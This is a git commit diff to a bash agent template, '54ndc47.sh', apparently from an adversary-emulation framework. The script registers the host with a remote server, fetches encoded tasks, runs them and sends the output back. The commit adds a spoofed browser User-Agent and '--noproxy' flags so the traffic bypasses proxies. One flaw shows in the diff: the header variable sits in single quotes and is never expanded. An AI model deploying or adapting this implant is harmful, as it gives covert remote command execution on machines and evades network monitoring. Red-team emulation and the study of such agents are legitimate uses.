3fdf4cff497e86b524f3a9e3faa6750c82d5e04d
David Hunt <49954156+privateducky@users.noreply.github.com>
2019-05-08 16:56:34 -0400

    User agent2 (#6)
    * adding user-agent to agent
    
    * adding user-agent to agent
    
    * updating the UI to use the correct proxy bypass commands
    
    * Quick fix for newlines breaking curl (#7)
    
    * adding user-agent to agent
    
    * adding user-agent to agent
    
    * updating the UI to use the correct proxy bypass commands
    
    * updated readme
    
    * for real, adding the updated readme

--- templates/54ndc47.sh
+++ templates/54ndc47.sh
@@ -1,9 +1,11 @@
 #!/bin/bash
 
 server='{{ url_root }}'
+server_ip=$(sed -E 's/([a-zA-Z]{4,5}\:\/\/)(.*)(\:[0-9]{1,6})/\2/' <<< $server)
 group='{{ group }}'
 # {% raw %}
 paw=$(hostname)$(whoami)
+user_agent_string='User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36'
 
 function getJsonVal () {
     python -c "import json,sys;sys.stdout.write(json.dumps(json.load(sys.stdin)$1))"
@@ -11,13 +13,13 @@ function getJsonVal () {
 
 function registration {
     body=$(echo '{"paw":"'"$paw"'","host":"'"$(hostname)"'","executor":"bash","group":"'"$group"'"}' | base64)
-    results=$(echo "$body" | curl -sk -X POST -d @- $server/sand/register)
+    results=$(echo "$body" | curl --noproxy $server_ip -sk -X POST -H '$user_agent_string' -d @- $server/sand/register)
     register=$(base64 --decode <<< ${results})
 }
 
 function getInstructions {
     body=$(echo '{"paw":"'"$paw"'","host":"'"$(hostname)"'","executor":"bash"}' | base64)
-    encodedTask=$(echo "$body" | curl -sk -X POST -d @- $server/sand/instructions)
+    encodedTask=$(echo "$body" | curl --noproxy $server_ip -sk -X POST -H '$user_agent_string' -d @- $server/sand/instructions)
     task=$(base64 --decode <<< ${encodedTask})
 }
 
@@ -35,7 +37,7 @@ function postResults {
             status=$(echo $?)
             encoded=$(echo "$output" | base64)
             body=$(echo '{"link_id":'"$taskId"',"paw":"'"$paw"'","output":"'"$encoded"'","status":'"$status"'}' | base64)
-            echo "$body" | curl -o /dev/null -sk -X POST -H "Content-Type: application/json" -d @- $server/sand/results
+            echo "$body" | curl --noproxy $server_ip -sk -X POST -H '$user_agent_string' -o /dev/null -H "Content-Type: application/json" -d @- $server/sand/results
         fi
         sleep $(echo "${task}" | getJsonVal "['sleep']")
     fi
